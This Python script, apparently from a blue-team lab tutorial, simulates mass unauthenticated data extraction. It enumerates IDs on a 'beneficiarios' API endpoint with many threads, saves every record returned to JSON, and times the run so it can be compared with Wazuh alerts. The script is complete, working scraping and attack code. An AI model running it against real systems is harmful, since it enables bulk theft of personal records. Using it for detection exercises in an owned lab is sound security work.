"""
Reproduce, de forma controlada, el patrón de extracción masiva sin
autenticación descrito en la Parte 1 del artículo (Fase 5 del plan).

SOLO correr contra el laboratorio aislado propio. No apuntar nunca
este script a un sistema que no sea tuyo.

Uso:
    python attacker_script.py --target http://<ip-victima>:8000 \
        --start-id 1 --end-id 5000 --threads 10 \
        --out extracted_data.json

Imprime el conteo de registros extraídos cada 2 segundos y, al
terminar, el tiempo total transcurrido — ese dato es el que luego
se compara con la hora de la primera alerta en Wazuh (paso 18 del
plan).
"""

import argparse
import json
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

extracted: list[dict] = []
lock = threading.Lock()
counter = {"ok": 0, "errores": 0}


def fetch(target: str, beneficiario_id: int, session: requests.Session) -> None:
    url = f"{target}/api/v1/beneficiarios/{beneficiario_id}"
    try:
        resp = session.get(url, timeout=5)
        if resp.status_code == 200:
            with lock:
                extracted.append(resp.json())
                counter["ok"] += 1
        else:
            with lock:
                counter["errores"] += 1
    except requests.RequestException:
        with lock:
            counter["errores"] += 1


def progress_reporter(stop_event: threading.Event, start_time: float) -> None:
    while not stop_event.is_set():
        elapsed = time.time() - start_time
        print(f"[+{elapsed:6.1f}s] extraídos: {counter['ok']} | errores: {counter['errores']}")
        time.sleep(2)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True, help="Ej: http://192.168.50.10:8000")
    parser.add_argument("--start-id", type=int, default=1)
    parser.add_argument("--end-id", type=int, default=5000)
    parser.add_argument("--threads", type=int, default=10)
    parser.add_argument("--out", default="extracted_data.json")
    args = parser.parse_args()

    session = requests.Session()
    ids = range(args.start_id, args.end_id + 1)

    start_time = time.time()
    print(f"Inicio del ataque simulado: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("^^^ ANOTA ESTA HORA — la vas a comparar con la primera alerta en Wazuh.")

    stop_event = threading.Event()
    reporter = threading.Thread(target=progress_reporter, args=(stop_event, start_time))
    reporter.start()

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = [pool.submit(fetch, args.target, i, session) for i in ids]
        for _ in as_completed(futures):
            pass

    stop_event.set()
    reporter.join()

    elapsed = time.time() - start_time
    print(f"\nFin del ataque simulado: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Duración total: {elapsed:.1f} segundos")
    print(f"Registros extraídos: {counter['ok']}  |  Errores: {counter['errores']}")

    with open(args.out, "w", encoding="utf-8") as f:
        json.dump(extracted, f, ensure_ascii=False, indent=2)
    print(f"Datos guardados en {args.out}")


if __name__ == "__main__":
    main()
